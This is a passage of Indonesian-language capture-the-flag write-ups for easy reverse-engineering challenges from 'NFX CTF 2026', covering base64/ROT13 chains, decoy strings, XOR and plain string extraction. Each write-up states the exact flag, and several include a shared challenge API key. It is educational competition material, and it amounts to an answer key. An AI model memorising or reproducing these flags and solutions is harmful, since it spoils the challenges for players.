Lampiran berupa script bash dengan fungsi `check()` yang membandingkan input pengguna terhadap string `expected`. Membaca fungsi itu memberi urutan transformasi yang jelas: input di-base64, lalu dibalik dengan `rev`, lalu diubah dengan `tr` ROT13, dan hasilnya harus sama dengan `expected`. Tidak ada kunci rahasia atau randomness di dalamnya, jadi pemahaman kuncinya adalah seluruh rantai bisa dibalik secara eksak. Urutan inversinya: ROT13 inverse (`tr 'N-ZA-Mn-za-m' 'A-Za-z'`), lalu reverse, lalu `base64.b64decode`. Hasilnya diverifikasi dengan menjalankan `check()` versi forward di Python agar cocok dengan `expected`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

- `check()` memakai 3 layer: `base64 → rev → tr ROT13`. Balik urutannya dari `expected`:
  1. ROT13-inverse (tr 'N-ZA-Mn-za-m' → 'A-Za-z')
  2. `[::-1]` (rev)
  3. `base64.b64decode`
- `expected = 9AGosOUZ0A3K0OwoskTokp3KmW3Z5EQosu2p0V2rLMxG` → flag.
- Diverifikasi: jalankan check forward di Python, cocok.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-config-decoy"></a>
# NFX CTF 2026 - Easy Config Decoy

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Binary ini membaca konfigurasi dan merangkai token rahasia dari empat potongan string. Beberapa field terlihat seperti konfigurasi C2 dan flag palsu untuk mengecoh analis.

> Format: NFX{...}

**Lampiran:**

- [easy_config](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_03_Config_Decoy/easy_config) (type: file)

**Berkas di workspace:** `easy_config`

---

### 2. TL;DR (Ringkasan Singkat)

Binary menyimpan beberapa string di .rodata, termasuk dua kandidat yang bentuknya sudah seperti flag utuh: NFX{th1s_1s_n0t_th3_fl4g} dan NFX{c2_b34c0n_p4rt_1s_f4k3}. Membaca .data menunjukkan tabel pointer di 0x4020 sampai 0x4048 yang menunjuk ke enam potongan dan label. Flag: `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`.

**Pemahaman inti:** Flag asli tidak utuh di memori, melainkan dirakit dari potongan lewat tabel pointer. Dua string lain sengaja ditaruh sebagai decoy yang terlihat meyakinkan.

---

### 3. Analisis Awal (Recon / Discovery)

Binary menyimpan beberapa string di `.rodata`, termasuk dua kandidat yang bentuknya sudah seperti flag utuh: `NFX{th1s_1s_n0t_th3_fl4g}` dan `NFX{c2_b34c0n_p4rt_1s_f4k3}`. Membaca `.data` menunjukkan tabel pointer di `0x4020` sampai `0x4048` yang menunjuk ke enam potongan dan label. Pemahaman kuncinya ada di alur program: `strcat` merangkai potongan sesuai urutan pointer, lalu `strcmp` membandingkan hasilnya dengan input. Jadi string yang terlihat seperti flag belum tentu flag, dan urutan pointer adalah sumber kebenarannya. Flag asli terbentuk dari `NFX{c0nf1g_` + `d3c0y_` + `p4rts_` + `4r3_fun}`. Verifikasi dilakukan dengan menjalankan salinan binary: flag rakitan diterima, sedangkan decoy ditolak.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

- `.rodata` berisi 3 string: flag asli terpecah jadi potongan `NFX{c0nf1g_` + `d3c0y_` + `p4rts_` + `4r3_fun}`, plus 2 decoy utuh:
  - `NFX{th1s_1s_n0t_th3_fl4g}` (decoy)
  - `NFX{c2_b34c0n_p4rt_1s_f4k3}` (decoy)
- Tabel pointer di `.data` (0x4020..0x4048) menunjuk ke 6 potongan/label → program `strcat` berurutan jadi flag asli, lalu `strcmp`.
- Diverifikasi langsung (salinan executable di `platform_tools/bin_work/`):
  - `./easy_config 'NFX{c0nf1g_d3c0y_p4rts_4r3_fun}'` → **Correct! Konfigurasi asli berhasil dirangkai.**
  - `./easy_config 'NFX{th1s_1s_n0t_th3_fl4g}'` → Wrong!
- Artefak salinan executable: `platform_tools/bin_work/easy_config` (asli tidak dimodifikasi).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-easy-js-obfuscation"></a>
# NFX CTF 2026 - Easy JS Obfuscation

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Validator Node.js ini menyimpan flag dalam array angka yang di-XOR dengan `0x33` lalu dibalik urutannya. Ada array umpan yang bila didecode menghasilkan flag palsu.

> Format: NFX{...}

**Lampiran:**

- [easy_js.js](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Easy_02_JS_Obfuscation/easy_js.js) (type: file)

**Berkas di workspace:** `easy_js.js`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa file JavaScript yang mengobfuskasi flag dalam array angka dan sebuah fungsi dekoder _0xd. Membaca fungsi itu memberi dua operasi: setiap elemen di-XOR dengan 0x33, lalu diubah menjadi karakter dengan fromCharCode, dan hasil akhirnya di-reverse(). Flag: `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`.

**Pemahaman inti:** Dekodernya hanya `String.fromCharCode(x ^ 0x33)` lalu `reverse()`. Array `_0x4f` adalah target, sedangkan `_0xdec` sengaja disiapkan sebagai decoy.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa file JavaScript yang mengobfuskasi flag dalam array angka dan sebuah fungsi dekoder `_0xd`. Membaca fungsi itu memberi dua operasi: setiap elemen di-XOR dengan `0x33`, lalu diubah menjadi karakter dengan `fromCharCode`, dan hasil akhirnya di-`reverse()`. Ada dua array yang perlu dibedakan: `_0x4f` berukuran 44 byte dan `_0xdec` yang menghasilkan `NFX{y0u_f0und_th3_wr0ng_4rr4y}`. Pemahaman kuncinya adalah mengikuti variabel mana yang benar-benar dibandingkan dengan input, yaitu `_0xt` yang berasal dari `_0x4f`. Decoding manual array itu dengan urutan XOR lalu reverse menghasilkan flag yang cocok dengan pembandingan `process.argv[2]`.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

- Dekoder `_0xd(arr)`: `String.fromCharCode(x ^ 0x33)` lalu `reverse()`.
- Target = `_0x4f` (44 byte) → dekoded = flag.
- Decoy: `_0xdec` → `NFX{y0u_f0und_th3_wr0ng_4rr4y}` (decoy, salah).
- Verifikasi: bandingkan `process.argv[2] === _0xt` - dekripsi ulang manual cocok.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-xor"></a>
# NFX CTF 2026 - Baby XOR

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Validator ini tidak menyimpan flag sebagai plaintext. Setiap byte flag di-XOR dengan satu byte kunci sebelum disimpan ke dalam array. Karena kuncinya hanya 8 bit, seluruh ruang kunci bisa dicoba dalam waktu singkat.

> Format: NFX{...}

**Lampiran:**

- [baby_xor](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_02_XOR/baby_xor) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_xor`

---

### 2. TL;DR (Ringkasan Singkat)

Binary berupa ELF 64-bit PIE yang sudah di-strip. strings tidak menemukan flag, yang berarti data flag sengaja di-encode. Flag: `NFX{x0r_1s_fun_but_n0t_s3cur3}`.

**Pemahaman inti:** XOR satu byte hanya punya 256 kemungkinan, dan hanya key 0x5A yang menghasilkan plaintext printable sekaligus pola `NFX{`. Tidak ada analisis lain yang diperlukan.

---

### 3. Analisis Awal (Recon / Discovery)

Binary berupa ELF 64-bit PIE yang sudah di-strip. `strings` tidak menemukan flag, yang berarti data flag sengaja di-encode. Karena ruang kunci untuk XOR satu byte hanya 256, pendekatan yang paling masuk akal adalah brute semua nilai dan menyaring hasilnya dengan dua kriteria: seluruh byte printable dan mengandung pola `NFX{...}`. Dari 256 kandidat hanya satu yang lolos, yaitu key `0x5A` (`Z`) pada offset 8272. Pemahaman kuncinya: soal ini bukan tentang membongkar algoritma, tetapi tentang memanfaatkan ruang kunci yang sangat kecil dan verifikasi struktur flag sebagai filter.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

- ELF 64-bit pie stripped (BuildID `7dcd406e…`); strings bersih → ter-encode.
- Brute 8-bit: `bytes(b ^ k for b in data)` untuk k=0..255, cari `NFX{`…`}` + printable.
- Kena **key 0x5A ('Z')** offset 8272. Hanya 1 dari 256 kandidat printable → unik.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{x0r_1s_fun_but_n0t_s3cur3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-python"></a>
# NFX CTF 2026 - Baby Python

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Sebuah script Python 'mengamankan' flag dengan membalik urutannya lalu meng-encode hasilnya dengan base64. Validator membandingkan input yang dibalik dengan hasil decode base64 tersebut.

> Format: NFX{...}

**Lampiran:**

- [baby_python.py](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_03_Python/baby_python.py) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_python.py`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran berupa script Python yang menyimpan _enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO' dan memvalidasi candidate[::-1] == base64.b64decode(_enc). Membaca ekspresi itu langsung memberi hubungan yang bisa dibalik: jika candidate[::-1] sama dengan hasil decode, maka candidate adalah hasil decode yang dibalik. Flag: `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`.

**Pemahaman inti:** Validasi hanya membalik input lalu membandingkannya dengan hasil base64 decode. Flag adalah hasil decode yang dibalik, tanpa perlu menjalankan file.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran berupa script Python yang menyimpan `_enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO'` dan memvalidasi `candidate[::-1] == base64.b64decode(_enc)`. Membaca ekspresi itu langsung memberi hubungan yang bisa dibalik: jika `candidate[::-1]` sama dengan hasil decode, maka `candidate` adalah hasil decode yang dibalik. Tidak ada kunci, hash, atau operasi lossy di dalamnya, sehingga flag bisa dihitung murni secara offline. Verifikasi dilakukan dengan menjalankan ulang ekspresi validasi pada hasil yang diperoleh, tanpa mengeksekusi file soal.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

- Validasi: `candidate[::-1] == base64.b64decode(_enc)` → flag = `b64decode(_enc)[::-1]`.
- `_enc = b'fTNmNHNfdDBuXzNyNF9zZDFrX3RwMXJjc19uMGh0eXB7WEZO'`.
- Dikerjakan offline (tidak mengeksekusi file).

---

### 5. Flag & Verifikasi

**Flag:** `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-baby-strings"></a>
# NFX CTF 2026 - Baby Strings

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Selamat datang di dunia reverse engineering. Diberikan sebuah binary ELF 64-bit sederhana yang meminta sebuah flag. Program ini tidak benar-benar menyembunyikan flag-nya: flag ada di dalam binary sebagai string biasa dan langsung dibandingkan dengan input.

> Format: NFX{...}

**Lampiran:**

- [baby_strings](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Baby_01_Strings/baby_strings) (type: file)

**Service / Target:**

- tidak ada (soal offline)

#### Cara pakai nxctl (key sama untuk semua soal)
```bash
B="https://ctf.nfx.my.id/api/nxctl"
K="X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
curl -s "$B?action=status" -H "$K" # daftar semua service
curl -s "$B?action=inspect&name=<nama>" -H "$K" # detail 1 service
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"up","name":"<nama>"}' # nyalakan (service mati)
curl -s -X POST "$B" -H "$K" -H 'Content-Type: application/json' -d '{"action":"extend","name":"<nama>"}' # tambah TTL (pas sisa <=900s, cooldown 30s)
```
> Service punya **TTL** (`remaining_seconds`) - kalau hampir habis, `extend` dulu sebelum exploit jalan.

**Berkas di workspace:** `baby_strings`

---

### 2. TL;DR (Ringkasan Singkat)

Binary berupa ELF 64-bit PIE yang sudah di-strip, sehingga tidak ada simbol yang membantu. Namun sebelum masuk ke disassembly, langkah termurah adalah memeriksa string yang dapat dicetak. Flag: `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`.

**Pemahaman inti:** Flag disimpan sebagai literal plaintext di binary, jadi `strings` dan grep sudah cukup. Tidak ada obfuscation yang perlu dibongkar.

---

### 3. Analisis Awal (Recon / Discovery)

Binary berupa ELF 64-bit PIE yang sudah di-strip, sehingga tidak ada simbol yang membantu. Namun sebelum masuk ke disassembly, langkah termurah adalah memeriksa string yang dapat dicetak. `strings -n 4 baby_strings` langsung menampilkan flag dalam bentuk plaintext, dan `grep -i nfx` mempersempit hasilnya. Pemahaman kuncinya: stripped hanya menghilangkan simbol, bukan data; selama flag disimpan tanpa encoding, ia tetap terbaca sebagai string. Tidak perlu menjalankan binary atau melakukan decompile.

---

### 4. Eksploitasi / Penyelesaian

#### SOLUSI (Solver-Bin, 7 Nov)

**Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

- ELF 64-bit pie stripped (BuildID `dc3dc8f6…`), flag literal plaintext.
- `strings -n 4 baby_strings | grep -i nfx` → flag langsung. Tanpa run/decompile.

Reproduksi: `file baby_strings` memastikan format ELF 64-bit, lalu `strings -n 4 baby_strings | grep -i nfx` membaca tabel string dan mencocokkan pola flag. Tidak ada langkah dekripsi karena flag disimpan apa adanya, dan BuildID di atas dipakai sebagai penanda binary yang diuji.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

